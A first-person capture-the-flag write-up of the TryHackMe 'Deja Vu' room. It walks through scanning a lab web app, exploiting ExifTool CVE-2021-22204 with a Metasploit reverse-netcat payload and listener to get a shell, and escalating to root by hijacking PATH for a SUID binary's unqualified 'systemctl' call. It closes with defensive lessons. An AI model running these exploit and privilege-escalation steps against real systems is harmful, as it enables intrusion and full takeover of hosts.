# TryHackMe — Deja Vu

**ExifTool RCE (CVE-2021-22204) | Reverse Shell | Linux Privilege Escalation via SUID and PATH Hijacking**

> **Full walkthrough — spoilers and flags included.** This write-up documents my completion of the guided *Deja Vu* room on TryHackMe, using its authorized lab machines. All testing was performed inside the provided training environment.

<img width="1222" height="157" alt="Forside" src="https://github.com/user-attachments/assets/8051b2fa-f445-4387-ba26-601f1a990d11" />


## Overview

The objective was to investigate a dog-photo web application, identify a vulnerable image-metadata processing component, gain initial access, and escalate privileges to root. The lab provided a useful end-to-end example of how multiple weaknesses can be chained together.

| Item | Details |
| --- | --- |
| Platform | TryHackMe — Deja Vu (guided room) |
| Attacker | THM AttackBox — `10.114.116.172` |
| Target | Deja Vu lab machine — `10.114.164.178` |
| Initial access | ExifTool code injection, **CVE-2021-22204** |
| Vulnerable version observed | **ExifTool 12.23** |
| Privilege escalation | Root-owned SUID/SGID binary with an unsafe `systemctl` lookup through `PATH` |
| Final result | Reverse shell as `dogpics`, followed by root access |

**Tools used:** Nmap, Gobuster, Burp Suite Community Edition, Metasploit Framework, Netcat, and standard Linux commands.

> The `10.114.x.x` addresses belonged to this particular TryHackMe session; they are not permanent room addresses.

## 1. Reconnaissance and web enumeration

### Identify the SSH version

I ran a targeted version scan against SSH, as requested by the room:

```bash
nmap -sV -p 22 10.114.164.178
```

**Result:** `22/tcp open ssh OpenSSH 8.0 (protocol 2.0)`. The `8.0` is the OpenSSH software version; `protocol 2.0` is the SSH protocol version.

### Discover the upload endpoint

I used Gobuster with the `big.txt` wordlist:

```bash
gobuster dir -u http://10.114.164.178 -w /usr/share/wordlists/dirb/big.txt
```

Relevant output:

```text
/favicon.ico   (Status: 200)
/upload        (Status: 301) [--> upload/]
```

This led to **`/upload/`**, where users could submit their own dog pictures.

### Inspect the application's API with Burp Suite

I visited a picture's detail page, `/dogpic/?id=0`, through Burp's proxy and examined **Target → Site map**. Two JSON API endpoints stood out:

| Endpoint | Observed purpose |
| --- | --- |
| `/dog/getmetadata/0` | Returned the picture's `title`, `caption`, and `id` |
| `/dog/getexifdata/0` | Returned extensive image metadata, including the ExifTool version |


<img width="1450" height="839" alt="site map" src="https://github.com/user-attachments/assets/c8f80baa-87a9-455c-a3c6-c58126d3dd37" />



The EXIF endpoint exposed the following JSON attribute:

```json
"ExifToolVersion": 12.23
```

This version disclosure was the key lead for vulnerability research. The server was returning considerably more metadata than its visible date/author display required.

## 2. Vulnerability identification — CVE-2021-22204

Researching **ExifTool 12.23** led to **CVE-2021-22204**, a code-injection vulnerability in the handling of specially crafted DjVu metadata. Affected ExifTool versions include **7.44 through 12.23**, with the issue fixed in **12.24**.

The TryHackMe walkthrough explained the underlying Perl issue with a patch diff. The vulnerable processing path used an `eval` on data derived from file metadata; the fix replaced this approach with explicit escape-sequence processing.

**Important distinction:** Discovering a vulnerable-looking software version is not proof of exploitability by itself. In this room, subsequent testing confirmed that the image-processing workflow could be exploited.

References:
- [NVD: CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
- [Conviso — A Case Study on CVE-2021-22204](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)
- [BlackBerry — From Fix to Exploit: ExifTool CVE-2021-22204](https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool)

## 3. Initial access — malicious image and reverse shell

I used Metasploit's file-format module to produce a crafted image for the vulnerable ExifTool processing path.

```text
msfconsole
search exiftool
use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 10.114.116.172
set LPORT 4444
show options
run
```

The output confirmed the file location:

```text
[+] msf.jpg stored at /root/.msf4/local/msf.jpg
```

**Why that payload?** My Metasploit installation initially selected `cmd/unix/php/meterpreter/reverse_tcp`, whereas the guided room used `cmd/unix/reverse_netcat`. I switched to the Netcat command payload and regenerated the file to match the walkthrough. The module also displayed `DisablePayloadHandler: True`, meaning I needed a separate listener.

In another AttackBox terminal, I started:

```bash
nc -lvnp 4444
```

I uploaded `msf.jpg` through `/upload/`, using `test` as the title and caption. **The listener did not receive a connection immediately after submission.** After opening the uploaded image's detail page (`/dogpic/?id=7` in my session), the application fetched the EXIF data and the callback appeared:

```text
Listening on 0.0.0.0 4444
Connection received on 10.114.164.178 37976
```


<img width="1247" height="1065" alt="connection established" src="https://github.com/user-attachments/assets/15888558-21cf-4fa4-a32e-688c2500702f" />


I checked which account the commands were running as:

```bash
whoami
# dogpics

ls
cat user.txt
```

**User flag:**

```text
dejavu{735c0553063625f41879e57d5b4f3352}
```

This demonstrated **remote code execution as the application user `dogpics`**, not root. Gaining initial access and obtaining administrative privileges were separate steps.

## 4. Privilege escalation — SUID and PATH hijacking

### Stabilize the shell

The first attempt to run the interactive `serverManager` menu appeared to hang because the basic Netcat shell did not provide a proper pseudo-terminal. Both `python3` and `python` were unavailable on the target.

I found another option:

```bash
command -v script
# /usr/bin/script

script -qc /bin/bash /dev/null
```

This produced a usable interactive Bash prompt as `dogpics`.

### Investigate the privileged binary

The room pointed to `serverManager` in the user's home directory. I verified its permissions:

```bash
ls -lah serverManager
# -rwsr-sr-x. 1 root root 18K Sep 11 2021 serverManager
```

The file was owned by `root` and had **SUID and SGID bits** set. I ran `./serverManager`, selected option `0` (*Get server status*), and confirmed the application called `systemctl status --no-pager dogpics`.

The source code supplied in the room included:

```c
setuid(0);
setgid(0);
system("systemctl status --no-pager dogpics");
```

The problem is the **unqualified command name `systemctl`** passed to `system()`. The shell searches the directories in the `PATH` environment variable and uses the first matching executable.

### Confirm PATH resolution and elevate privileges

Before the change, the genuine command was selected:

```bash
which systemctl
# /usr/bin/systemctl
```

There was already an executable `systemctl` file in `/home/dogpics`. I inspected it rather than assuming it was safe or overwriting it:

```bash
ls -lah systemctl
# -rwxrwxr-x. 1 dogpics dogpics 13 Sep 11 2021 systemctl

cat systemctl
# /bin/bash -p
```

The `-p` argument asks Bash to preserve privileged-mode behavior. I then prepended the current directory to `PATH`, causing the attacker-controlled file to resolve before `/usr/bin/systemctl`:

```bash
export PATH=.:$PATH
which systemctl
# ./systemctl
```

Finally, I ran the SUID program and selected option `0` again:

```bash
./serverManager
# 0 - Get server status
# 1 - Restart server
# Entered: 0

whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root),1000(dogpics)
```

The privileged manager ran the local replacement for `systemctl`, which launched Bash with root privileges. This is **PATH hijacking combined with unsafe use of a privileged SUID binary**.

I then retrieved the final flag:

```bash
cd /root
cat root.txt
```

**Root flag:**

```text
dejavu{5ad931368bdc46f856febe4834ace627}
```


<img width="1324" height="889" alt="Siste flagget" src="https://github.com/user-attachments/assets/a14871af-42ac-4441-83de-19ac54cb623d" />



## 5. Findings and defensive lessons

| Finding | Risk | Defensive takeaway |
| --- | --- | --- |
| ExifTool 12.23 exposed via an API response | Reveals information that helps identify known vulnerabilities | Minimize unnecessary API metadata; do not rely on obscurity as a substitute for patching |
| ExifTool CVE-2021-22204 | Crafted metadata could lead to code execution in the image-processing context | Update ExifTool to a patched release; isolate image processing and constrain privileges |
| Root-owned SUID `serverManager` | An application utility executes with elevated privileges | Avoid unnecessary SUID binaries; apply least privilege and narrowly scoped capabilities where appropriate |
| `system("systemctl ...")` without an absolute path | Command resolution can be redirected through attacker-influenced `PATH` | Avoid shell-based command execution when possible; use explicit executable paths and a controlled environment |
| Insufficient defense in depth | Initial access could be chained into root compromise | Use layered protections, including least privilege, secure configuration, and appropriate mandatory access controls |

## 6. What I learned

- **Enumeration drives exploitation.** Gobuster revealed the upload route, and Burp exposed the API metadata that led to the relevant CVE.
- **The trigger matters.** The payload was uploaded first, but the callback appeared when the picture's detail page requested EXIF data.
- **A reverse shell is not necessarily interactive.** Using `script` resolved the PTY problem when Python was unavailable.
- **RCE is not automatically root access.** The initial shell ran as `dogpics`; a separate local misconfiguration enabled privilege escalation.
- **Small implementation details create major risks.** An unqualified command path inside a SUID program was sufficient to turn limited access into root access in this lab.

---

*This is a learning write-up for an intentionally vulnerable TryHackMe environment, not a report of testing against a live third-party service.*
